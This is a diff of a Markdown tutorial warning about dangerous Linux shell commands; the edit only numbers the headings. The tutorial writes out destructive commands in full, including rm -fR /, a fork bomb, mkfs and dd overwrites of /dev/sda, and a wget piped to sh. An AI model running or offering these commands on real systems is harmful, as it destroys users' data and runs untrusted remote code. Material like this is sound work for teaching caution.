@@ -10,55 +10,55 @@ Most of the commands in this tutorial are **really dangerous**!!!
 DO NOT use these commands on a real system if you have no idea of what you are going to do.
 
 
-#### Wipeout!
+#### :one: Wipeout!
 
 `rm -fR /`
 
 With this command you asking to delete every files in your disk. Your only hope is that some security control will denied you to do something so silly.
 
 
-#### Fork Bomb
+#### :two: Fork Bomb
 
 `:(){ :|: & };:`
 
 Elegant and deadly as a dark-lady. This short shell script replicates itself until all the processing capabilities of your computer will be occupied. Shutdown and restart seems to be the only solution.
 
 
-#### Tabula rasa
+#### :three: Tabula rasa
 
 `mkfs.ext4 /dev/sda1`
 
 Do you remember `FORMAT C:` of the old DOS? this have the same result.
 
-#### Right Time, but Wrong Place
+#### :four: Right Time, but Wrong Place
 
 `date > /dev/sda`
 
 Redirecting will write raw bytes on your disk partition. What can never will be? nothing good! surely.
 
 
-#### Collecting Junk is a Dirty Job
+#### :five: Collecting Junk is a Dirty Job
 
 `dd if=/dev/random of=/dev/sda`
 
 
-#### Have to start again
+#### :six: Have to start again
 
 `mv ~ /dev/null`
 
 This command will move all your personal data in the Linux equivalent of a Black Hole.
 
 
-#### Danger from the Outside
+#### :seven: Danger from the Outside
 
 `wget http://example.com/something -O – | sh –`
 
 
-#### No More Busy
+#### :eight: No More Busy
 
 `find / -name busybox -exec rm -f {} \;`
 
-#### Don't Panic
+#### :nine: Don't Panic
 
 `cat /dev/port`
 
